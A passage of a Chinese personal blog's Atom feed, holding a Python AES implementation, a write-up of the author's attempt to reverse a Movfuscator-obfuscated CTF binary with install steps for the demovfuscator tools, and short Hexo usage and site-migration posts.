class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(i^j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">s, k</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s[i][j] ^= k[i][j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s[i][j] = s_box[s[i][j]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">s</span>):</span><br><span class="line">    s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>] = s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>], s[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>], s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>] = s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>], s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">    s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>] = s[<span class="number">3</span>][<span class="number">3</span>], s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考 http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c</span></span><br><span class="line">xtime = <span class="keyword">lambda</span> a: (((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">if</span> (a &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (a &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_single_column</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="comment"># see Sec 4.1.2 in The Design of Rijndael</span></span><br><span class="line">    t = a[<span class="number">0</span>] ^ a[<span class="number">1</span>] ^ a[<span class="number">2</span>] ^ a[<span class="number">3</span>]</span><br><span class="line">    u = a[<span class="number">0</span>]</span><br><span class="line">    a[<span class="number">0</span>] ^= t ^ xtime(a[<span class="number">0</span>] ^ a[<span class="number">1</span>])</span><br><span class="line">    a[<span class="number">1</span>] ^= t ^ xtime(a[<span class="number">1</span>] ^ a[<span class="number">2</span>])</span><br><span class="line">    a[<span class="number">2</span>] ^= t ^ xtime(a[<span class="number">2</span>] ^ a[<span class="number">3</span>])</span><br><span class="line">    a[<span class="number">3</span>] ^= t ^ xtime(a[<span class="number">3</span>] ^ u)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        mix_single_column(s[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_expand_key</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        word = <span class="built_in">list</span>(s[-<span class="number">1</span>])  <span class="comment"># 取得最后一列</span></span><br><span class="line">        word.append(word.pop(<span class="number">0</span>)) <span class="comment"># 将首位移动到最后</span></span><br><span class="line">        word = [s_box[b] <span class="keyword">for</span> b <span class="keyword">in</span> word]  <span class="comment"># SubBytes操作</span></span><br><span class="line">        word[<span class="number">0</span>] ^= r_con[i]  <span class="comment"># 和异或表内数据异或</span></span><br><span class="line"></span><br><span class="line">        s.append(xor_bytes(word, s[-<span class="number">4</span>]))  <span class="comment"># 得到新的子密钥</span></span><br><span class="line">        s.append(xor_bytes(s[-<span class="number">1</span>], s[-<span class="number">4</span>]))  <span class="comment"># 因为直接在s中添加，所以本该和上一轮第二列异或的位置还是-4</span></span><br><span class="line">        s.append(xor_bytes(s[-<span class="number">1</span>], s[-<span class="number">4</span>]))</span><br><span class="line">        s.append(xor_bytes(s[-<span class="number">1</span>], s[-<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [s[<span class="number">4</span>*i : <span class="number">4</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) // <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes2matrix</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix.  &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">list</span>(text[i:i+<span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line">plain = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line">skeys = _expand_key(bytes2matrix(key))</span><br><span class="line">plain = bytes2matrix(plain)</span><br><span class="line"></span><br><span class="line">add_round_key(plain, skeys[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    sub_bytes(plain)</span><br><span class="line">    shift_rows(plain)</span><br><span class="line">    mix_columns(plain)</span><br><span class="line">    add_round_key(plain, skeys[i])</span><br><span class="line"></span><br><span class="line">sub_bytes(plain)</span><br><span class="line">shift_rows(plain)</span><br><span class="line">add_round_key(plain, skeys[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>(plain[<span class="number">0</span>]+plain[<span class="number">1</span>]+plain[<span class="number">2</span>]+plain[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(enc)  <span class="comment"># b&#x27;m\xac\x1cV\xe7G\xfa\xe0:\xcf\x8ch\x91\xe4(\xe0&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="封装库实现-1"><a href="#封装库实现-1" class="headerlink" title="封装库实现"></a>封装库实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line">plain = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">enc = cipher.encrypt(plain)</span><br><span class="line"><span class="built_in">print</span>(enc)  </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;HNCTF&quot;&gt;&lt;a href=&quot;#HNCTF&quot; class=&quot;headerlink&quot; title=&quot;HNCTF&quot;&gt;&lt;/a&gt;HNCTF&lt;/h1&gt;&lt;h2 id=&quot;baBAbaseSEse（base家族）&quot;&gt;&lt;a href=&quot;#baBAbase</summary>
      
    
    
    
    <category term="Crypto" scheme="https://kidder1.github.io/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="https://kidder1.github.io/tags/Crypto/"/>
    
    <category term="Math" scheme="https://kidder1.github.io/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Movfuscator混淆研究</title>
    <link href="https://kidder1.github.io/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/"/>
    <id>https://kidder1.github.io/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/</id>
    <published>2023-07-19T07:05:36.000Z</published>
    <updated>2023-08-02T10:01:56.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="混淆器"><a href="#混淆器" class="headerlink" title="混淆器"></a>混淆器</h1><p>在mov指令的图灵完备性被证明之后，就产生了一种使用mov指令代替其他各种指令的混淆机制，运算，跳转，函数调用都可以全部使用mov指令实现。</p><p>Githhub链接：<a href="https://github.com/xoreaxeaxeax/movfuscator">https://github.com/xoreaxeaxeax/movfuscator</a> 按照github安装之后，正常编译就行</p><h1 id="解混淆器"><a href="#解混淆器" class="headerlink" title="解混淆器"></a>解混淆器</h1><p>Github链接：<a href="https://github.com/kirschju/demovfuscator">https://github.com/kirschju/demovfuscator</a></p><p>这个需要三个库：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">- libcapstone</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/aquynh/capstone.git</span></span><br><span class="line">cd capstone/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">- libz3</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/Z3Prover/z3.git</span></span><br><span class="line">cd z3</span><br><span class="line">python scripts/mk_make.py</span><br><span class="line">cd build</span><br><span class="line">make</span><br><span class="line">sudo make install </span><br><span class="line">- libkeystone</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/keystone-engine/keystone.git</span></span><br><span class="line">cd keystone/</span><br><span class="line">sudo mkdir build</span><br><span class="line">cd build/</span><br><span class="line">sudo ../make-share.sh </span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line">- demovfuscator </span><br><span class="line">git clone https:<span class="comment">//github.com/kirschju/demovfuscator.git</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><ul><li>思路mov混淆的解决方式：<ol><li>简单的，会在某个寄存器中出现，全局搜索该寄存器后可以得出结果</li><li>或者可以使用动态调试出结果</li><li>难的，需要爆破</li><li>使用工具 https:&#x2F;&#x2F;<a href="https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020">github</a>.com&#x2F;kirschju&#x2F;demovfuscator</li><li>找到字符串然后根据读写断点观察输入在内存的变化找到&#x2F;猜测加密逻辑</li></ol></li></ul><h1 id="例子ciscn-2023-moveAside"><a href="#例子ciscn-2023-moveAside" class="headerlink" title="例子ciscn 2023 moveAside"></a>例子ciscn 2023 moveAside</h1><p>这道题mov混淆呢，当时没有做出来，现在看了一些师傅的题解，稍微复盘总结一</p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><p>找到字符串向上翻阅</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171047390.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171047390.png"  class="" lazyload></a><p>可以找到密文，这里我已经转成数组形式了</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171223774.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171223774.png"  class="" lazyload></a><p>这里可以得到字符串长度是44</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719172931878.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719172931878.png"  class="" lazyload></a><p>然后这里直接下断点调试的话是会触发异常的，可以看到这里调用了sigaction函数</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092516751.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092516751.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092828038.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092828038.png"  class="" lazyload></a><p>IDA这个异常处理的过程我一直不是很了解,根据搜索字符串然后下断点调试再试试</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102536313.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102536313.png"  class="" lazyload></a><p>这里又触发异常了，这里设置成这样好像就不会有提示了</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102714851.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102714851.png"  class="" lazyload></a><p>然后这个一直按着F9调试一直等到所有的停住即可</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720110254452.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720110254452.png"  class="" lazyload></a><p>然后一直没有反应，在密文那块下了一个读写断点</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111141895.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111141895.png"  class="" lazyload></a><p>密文长度</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111254827.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111254827.png"  class="" lazyload></a><p>跳不出来，，，我晕了。。。。算了还是太菜了。。。</p><h2 id="用工具"><a href="#用工具" class="headerlink" title="用工具"></a>用工具</h2><p>这个破工具装了一下午，刚开始在ubuntu18上面，结果那个clang的版本不够，然后有在22上面装，结果编译那个库编译了几十分钟，然后我又make -j8，才搞好。</p><p>试试效果怎么样</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719182131996.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719182131996.png"  class="" lazyload></a><p>好吧，结果惨不忍睹，不能运行，不能反编译，跟没用一样。。。大概也就这样，这玩意肯定工程上面用不上，只能对简单的程序进行一些操作，也只能在CTF这里玩完了，但不妨碍它是一个伟大的发明。</p><p>参考博客</p><p><a href="https://blog.csdn.net/CherestSan/article/details/117608664">(121条消息) movfuscator混淆_mov混淆_Cherest_San的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/weixin_52118017/article/details/130997247">CISCN 2023 初赛]moveAside_FeiJiNcFan的博客-CSDN博客</a></p><p><a href="https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/#moveaside">CISCN2023 初赛 Writeup by or4nge (or4ngesec.github.io)</a></p><p><a href="https://blog.csdn.net/qq_33438733/article/details/79860304">(121条消息) movfuscator混淆了解一下 CTF_mov混淆_坚强的女程序员的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;混淆器&quot;&gt;&lt;a href=&quot;#混淆器&quot; class=&quot;headerlink&quot; title=&quot;混淆器&quot;&gt;&lt;/a&gt;混淆器&lt;/h1&gt;&lt;p&gt;在mov指令的图灵完备性被证明之后，就产生了一种使用mov指令代替其他各种指令的混淆机制，运算，跳转，函数调用都可以全部使用mov指</summary>
      
    
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Hexo使用手册</title>
    <link href="https://kidder1.github.io/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <id>https://kidder1.github.io/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</id>
    <published>2023-07-18T01:30:09.000Z</published>
    <updated>2023-08-02T09:56:03.516Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo使用说明</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo n  # 创建文章</span><br><span class="line">hexo cl # 清理缓存</span><br><span class="line">hexo g  # 生成博客</span><br><span class="line">hexo s  # 本地部署</span><br><span class="line">hexo d  # 上线部署</span><br></pre></td></tr></table></figure><a class="simple-lightbox" href="/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/image-20230718094005578.png"><img   src="/images/loading.svg" data-src="/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/image-20230718094005578.png"  class="" title="This is an test image" lazyload></a><p>插入图片的话，安装插件，然后用下面的格式进行插入即可，图片描述可以自行修改</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img imageName imageDescription %&#125;</span><br></pre></td></tr></table></figure><p>博客的分类标签摘要等配置看下图即可</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: Hexo使用说明</span><br><span class="line">date: 2023-07-18 09:30:09</span><br><span class="line">author: Kidder1</span><br><span class="line">summary: Hexo使用简要说</span><br><span class="line">categories: Begin</span><br><span class="line">tag: </span><br><span class="line">- Begin </span><br><span class="line">- Hexo</span><br></pre></td></tr></table></figure><p>在根目录下面设置了两个sh文件，无论部署还是测试直接运行即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hexo使用说明&lt;/p&gt;
&lt;figure class=&quot;highlight text&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
    <category term="Begin" scheme="https://kidder1.github.io/tags/Begin/"/>
    
    <category term="Hexo" scheme="https://kidder1.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>博客配置说明书</title>
    <link href="https://kidder1.github.io/2023/07/17/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%E4%B9%A6/"/>
    <id>https://kidder1.github.io/2023/07/17/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%E4%B9%A6/</id>
    <published>2023-07-16T16:00:00.000Z</published>
    <updated>2023-08-02T08:36:43.656Z</updated>
    
    <content type="html"><![CDATA[<p>主题配置说明书：<a href="https://minimalism.codeover.cn/docs/introduction">https://minimalism.codeover.cn/docs/introduction</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主题配置说明书：&lt;a href=&quot;https://minimalism.codeover.cn/docs/introduction&quot;&gt;https://minimalism.codeover.cn/docs/introduction&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
  </entry>
  
  <entry>
    <title>转站说明</title>
    <link href="https://kidder1.github.io/2023/07/17/%E8%AF%B4%E6%98%8E/"/>
    <id>https://kidder1.github.io/2023/07/17/%E8%AF%B4%E6%98%8E/</id>
    <published>2023-07-16T16:00:00.000Z</published>
    <updated>2023-08-02T09:10:16.610Z</updated>
    
    <content type="html"><![CDATA[<p>懒得维护这么一个网站，东西越多，事情越多，很多东西不能专注，然后就会报复性的放松和逃避，我想这不是一个解决事情的好办法。想来想去，还是决定从一个新的地方开始了。<br>美化的尽头总是简约了，目的还是记录一些后面可以用的到的东西。关于我有我的微信，希望大家喜欢和和多多交流。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;懒得维护这么一个网站，东西越多，事情越多，很多东西不能专注，然后就会报复性的放松和逃避，我想这不是一个解决事情的好办法。想来想去，还是决定从一个新的地方开始了。&lt;br&gt;美化的尽头总是简约了，目的还是记录一些后面可以用的到的东西。关于我有我的微信，希望大家喜欢和和多多交流。&lt;</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
    <category term="Begin" scheme="https://kidder1.github.io/tags/Begin/"/>
    
  </entry>
  
</feed>
